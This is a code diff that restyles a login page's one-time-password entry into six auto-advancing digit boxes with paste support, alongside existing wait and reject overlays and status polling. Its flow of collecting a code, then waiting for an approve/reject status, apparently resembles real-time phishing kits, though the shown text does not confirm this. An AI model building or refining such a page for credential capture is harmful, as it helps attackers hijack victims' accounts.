@@ -140,48 +140,64 @@
     text-align: center;
   }
   .otp-field {
-    text-align: left;
+    text-align: center;
     margin-bottom: 16px;
   }
   .otp-field label {
     display: block;
     font-size: 13px;
     color: var(--muted);
-    margin-bottom: 8px;
+    margin-bottom: 12px;
+    text-align: center;
   }
-  .otp-field input {
-    width: 100%;
-    border: none;
-    border-bottom: 2px solid var(--border);
-    padding: 8px 0;
+  .otp-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    direction: ltr;
+  }
+  .otp-box {
+    width: 46px;
+    height: 54px;
+    border: 2px solid var(--border);
+    border-radius: 12px;
     font-size: 22px;
-    letter-spacing: 6px;
+    font-weight: 700;
     text-align: center;
     color: var(--text-dark);
-    background: transparent;
-    transition: border-color 0.2s;
+    background: var(--light-bg);
+    transition: all 0.2s;
+    caret-color: #1a56db;
   }
-  .otp-field input:focus {
+  .otp-box:focus {
     outline: none;
-    border-bottom-color: #7B0C22;
-    color: #7B0C22;
+    border-color: #1a56db;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(26,86,219,0.12);
+    transform: scale(1.05);
   }
-  .otp-field input:not(:placeholder-shown) {
-    color: #7B0C22;
-    border-bottom-color: #7B0C22;
+  .otp-box.filled {
+    border-color: #1a56db;
+    background: #fff;
+    color: #1a56db;
+  }
+  .otp-hidden {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
   }
   .req {
     display: none;
     font-size: 11.5px;
     color: #c0392b;
     margin: 6px 0 0;
-    text-align: left;
+    text-align: center;
   }
   .invalid .req {
     display: block;
   }
-  .invalid input {
-    border-bottom-color: #c0392b;
+  .invalid .otp-box {
+    border-color: #c0392b;
   }
   .submit-btn {
     display: block;
@@ -286,8 +302,16 @@
       <p class="lead">A verification code (OTP) has been sent to your phone. Please enter it to complete login.</p>
       
       <div class="otp-field" id="otpField">
-        <label for="otp">Verification Code</label>
-        <input type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="------">
+        <label>Verification Code</label>
+        <div class="otp-boxes" id="otpBoxes">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="0" autocomplete="off">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="1" autocomplete="off">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="2" autocomplete="off">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="3" autocomplete="off">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="4" autocomplete="off">
+          <input type="text" class="otp-box" inputmode="numeric" maxlength="1" data-idx="5" autocomplete="off">
+        </div>
+        <input type="hidden" id="otp">
         <span class="req">Code is required</span>
       </div>
       <button class="submit-btn" id="verifyBtn" type="button">Confirm</button>
@@ -340,11 +364,10 @@
         if (req) req.textContent = msg;
       }
       var otpInput = document.getElementById('otp');
-      if (otpInput) {
-        otpInput.value = '';
-        otpInput.disabled = false;
-        otpInput.focus();
-      }
+      if (otpInput) otpInput.value = '';
+      document.querySelectorAll('.otp-box').forEach(function(b){ b.value=''; b.classList.remove('filled'); b.disabled=false; });
+      var firstBox = document.querySelector('.otp-box');
+      if (firstBox) firstBox.focus();
       var verifyBtn = document.getElementById('verifyBtn');
       if (verifyBtn) verifyBtn.disabled = false;
       var waitOverlay = document.getElementById('waitOverlay');
@@ -371,6 +394,42 @@
     var rejectOverlay = document.getElementById('rejectOverlay');
     var statusPollTimer = null;
     var hasSubmittedOtp = false;
+
+    var boxes = document.querySelectorAll('.otp-box');
+    function syncHidden(){
+      var val = '';
+      boxes.forEach(function(b){ val += b.value; });
+      otpInput.value = val;
+    }
+    boxes.forEach(function(box, i){
+      box.addEventListener('input', function(e){
+        var v = this.value.replace(/\D/g,'');
+        this.value = v.slice(0,1);
+        this.classList.toggle('filled', !!this.value);
+        if(v && i < boxes.length - 1) boxes[i+1].focus();
+        syncHidden();
+      });
+      box.addEventListener('keydown', function(e){
+        if(e.key === 'Backspace' && !this.value && i > 0){
+          boxes[i-1].focus();
+          boxes[i-1].value = '';
+          boxes[i-1].classList.remove('filled');
+          syncHidden();
+        }
+      });
+      box.addEventListener('paste', function(e){
+        e.preventDefault();
+        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+        for(var j = 0; j < boxes.length && j < text.length; j++){
+          boxes[j].value = text[j];
+          boxes[j].classList.add('filled');
+        }
+        var focusIdx = Math.min(text.length, boxes.length - 1);
+        boxes[focusIdx].focus();
+        syncHidden();
+      });
+    });
+    if(boxes[0]) boxes[0].focus();
 
     function normalizeStatus(value){
       return String(value || '').trim().toLowerCase();
@@ -483,7 +542,8 @@
       waitOverlay.classList.remove('show');
       otpForm.style.display = 'block';
       otpInput.value = '';
-      otpInput.disabled = false;
+      boxes.forEach(function(b){ b.value=''; b.classList.remove('filled'); b.disabled=false; });
+      if(boxes[0]) boxes[0].focus();
       otpField.classList.remove('invalid');
       hasSubmittedOtp = false;
       stopPoll();
